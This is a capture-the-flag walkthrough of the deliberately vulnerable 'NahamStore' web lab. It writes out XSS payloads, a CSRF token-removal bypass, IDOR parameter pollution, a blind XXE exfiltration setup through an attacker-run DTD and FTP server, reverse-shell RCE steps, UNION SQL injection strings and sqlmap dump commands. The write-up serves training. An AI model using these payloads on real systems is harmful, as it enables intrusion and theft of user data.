# Naham Store

## Recon

### Subdomains

`wfuzz -c -z file,/usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u "http://nahamstore.thm/" -H "Host: FUZZ.nahamstore.thm" --hw 65`

Output with colors ( -c ) payload ( -z ) url ( -u ) Host ( -H ) Hide words ( --hw 65 )

`www.nahamstore.thm`

`stock.nahamstore.thm`

`marketing.nahamstore.thm`

`shop.nahamstore.thm`

Add them to `/etc/hosts` file

## nahamstore.thm

### LFI

![Untitled](images/Untitled.png)

After searching a bit we got the flag that we wanted

![Untitled](images/Untitled%201.png)

### Open Redirect

If follow the redirect it goes to `http://10.9.11.107:8000/`

![Untitled](images/Untitled%202.png)

More redirect

![Untitled](images/Untitled%203.png)

Easy way to find redirects, browse the hole website with brup, and inside burp activate this setting 

![Untitled](images/Untitled%204.png)

The other redirect is on the parameter `r`, to find this we had to do a parameter FUZZ

![Untitled](images/Untitled%205.png)

![Untitled](images/Untitled%206.png)

### stock.nahamstore.thm

Found the subdomain stock.nahamstore.thm by whatching some requests on Burp and the found this one:

![Untitled](images/Untitled%207.png)

Then i added to `/etc/hosts` file and the site showed this

![Untitled](images/Untitled%208.png)

Its the API from `nahamstore.thm`

## marketing.nahamstore.thm

### XSS

Payload `<script>alert(1)</script>`

![Untitled](images/Untitled%209.png)

Payload used  `'; alert(document.domain);’` we bypass the script value and insert a new one

![Untitled](images/Untitled%2010.png)

The output

![Untitled](images/Untitled%2011.png)

### Stored XSS

- nahamstore.thm
    - Shipping address ( <> & # ; )
    

User agent > payload `<img src=x onerror=alert()>`

![Untitled](images/Untitled%2012.png)

![Untitled](images/Untitled%2013.png)

![Untitled](images/Untitled%2014.png)

Text area XSS

![Untitled](images/Untitled%2015.png)

![Untitled](images/Untitled%2016.png)

### XSS name parameter

Insert random value and inspect

![Untitled](images/Untitled%2017.png)

Here we escape the title tag and insert the XSS payload

![Untitled](images/Untitled%2018.png)

### Discount

![Untitled](images/Untitled%2019.png)

If we pass that parameter to a GET request it will be transferd to the URL

Payload

![Untitled](images/Untitled%2020.png)

### XSS Not found page

![Untitled](images/Untitled%2021.png)

## CSRF

### Change password

Here we can see there is no csrf protection

![Untitled](images/Untitled%2022.png)

### Change email

I tried csrf with the given csrf token

![Untitled](images/Untitled%2023.png)

But got the error invalid token, so i removed the token completely, leaving the request like this

![Untitled](images/Untitled%2024.png)

And we bypassed the protection

![Untitled](images/Untitled%2025.png)

### Token encoding type

![Untitled](images/Untitled%2026.png)

## IDOR

Found IDOR when we submit the purchase and we use an address

![Untitled](images/Untitled%2027.png)

When we put id with the value 3 we get the flag

![Untitled](images/Untitled%2028.png)

### Next IDOR

Now we need to get the details of order number 3

![Untitled](images/Untitled%2029.png)

When we try to generate a PDF with id 3 it give me this error

![Untitled](images/Untitled%2030.png)

![Untitled](images/Untitled%2031.png)

After some research of IDOR we could user parameter polution, and this worked `what=order&id=3%26user_id=3`

![Untitled](images/Untitled%2032.png)

## XXE

### First XXE

Fuzzing parameters with `ffuf -u http://stock.nahamstore.thm/product/1?FUZZ -w burp-parameter-names.txt -fs 41`

![Untitled](images/Untitled%2033.png)

After knowing there is a xml parameter we try to use it

![Untitled](images/Untitled%2034.png)

Now we know that we can put some XML inside the page, but there was this error

![Untitled](images/Untitled%2035.png)

To bypass this i used the entity `<root>` with `<X-Token>` and we got the flag using this payload

![Untitled](images/Untitled%2036.png)

### Blind XXE

We saw that we have a restriction, it only accepts `.xlsx` files inside the `PayloadAllTheThings` there is some payloads that worked

- First we need to create a exel file and export it as `.xlsx`
- Then send it to your atacker machine
- After having the file we have to unzip it `unzip test.xlsx` , the output should be like this

![Untitled](images/Untitled%2037.png)

As we saw in the PayloadAllTheThings

![Untitled](images/Untitled%2038.png)

We just copy that payload to our file extracted file `xl/workbook.xml` and put your local IP

![Untitled](images/Untitled%2039.png)

Here we can see that the payload access the `xxe.dtd` file so we need to open a local server

**Open python HTTP server**

To open a Python Web Server we use the command `python3 -m http.server 80`

![Untitled](images/Untitled%2040.png)

After that we have to export all the files to a new `.xlsx` to do that we use  `7z u ../evil.xlsx *` and make sure you are inside this directory

![Untitled](images/Untitled%2041.png)

Now we need to try if the payload is accessing our local server by uploading the new `.xlsx` file

![Untitled](images/Untitled%2042.png)

Now check if the python web server responded something like this

![Untitled](images/Untitled%2043.png)

This means that he is trying to get the `xxe.dtd` file but there isn’t, now its time to create that file

Create a file named `xxe.dtd` with this content but with your IP

![Untitled](images/Untitled%2044.png)

Now we need to make a ftp server

![Untitled](images/Untitled%2045.png)

Let’s download the xxeserv, use this command `git clone https://github.com/staaldraad/xxeserv.git` now use `cd` inside the `xxeserv` and do `go mod init xxeftp.go`

![Untitled](images/Untitled%2046.png)

Now we can do `go build`

![Untitled](images/Untitled%2047.png)

Run the FTP server

`./xxeftp.go -o files.log -p 2121 -w -wd public -wp 8000`

![Untitled](images/Untitled%2048.png)

Now that we have all the things ready let’s exploit it

Go the website and upload the `evil.xlsx`

Inside the python server should look like this 

![Untitled](images/Untitled%2049.png)

And inside the ftp server

![Untitled](images/Untitled%2050.png)

Now that all is good we need to cat the files.log were the `./xxeftp` is

![Untitled](images/Untitled%2051.png)

## RCE

In this step i was stuck so i came back to recon and there was a port 8000 and it was empty after some directory fuzzing

`ffuf -u http://10.10.57.149:8000/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt`

![Untitled](images/Untitled%2052.png)

Login page, with admin:admin credentials

![Untitled](images/Untitled%2053.png)

After inspecting the code i found this link

![Untitled](images/Untitled%2054.png)

Here was html code, so i just put there a php reverse shell

![Untitled](images/Untitled%2055.png)

Payload

![Untitled](images/Untitled%2056.png)

Getting the flag

![Untitled](images/Untitled%2057.png)

### Blind RCE

There was no response from the website so we had to do blind rce by using a reverse shell and checking if it connects back to us.

Open a nc listener

![Untitled](images/Untitled%2058.png)

PayloadAllTheThings reverse shell

![Untitled](images/Untitled%2059.png)

After modifying a bit the shell we got the connection

![Untitled](images/Untitled%2060.png)

Getting the flag

![Untitled](images/Untitled%2061.png)

### SQL Injection

Found that the site accepts 5 columns per query

`/product?id=2 UNION SELECT NULL,NULL,NULL,NULL,NULL`

![Untitled](images/Untitled%2062.png)

Then i had to change to id 3 because it doesn’t exist and there is the output of the flag

`/product?id=3 UNION SELECT null,flag,NULL,NULL,null from sqli_one`

![Untitled](images/Untitled%2063.png)

### Blind SQL injection

After testing for every endpoint found, we could get SQLi inside `/returns`

I copied the request and put inside txt file and then to SQLmap

![Untitled](images/Untitled%2064.png)

`sqlmap -r request.txt --batch` with this command the sqlmap will find the vulnerability

Then we need to do `sqlmap -r request.txt --dbs` to get the database name, once we found it we can retrive the tables using `sqlmap -r request.txt -D nahamstore --tables`

![Untitled](images/Untitled%2065.png)

Getting the content of `sqli_two`, use `sqlmap -r request -D nahamstore -T sqli_two --dump`

And you will get the flag

![Untitled](images/Untitled%2066.png)
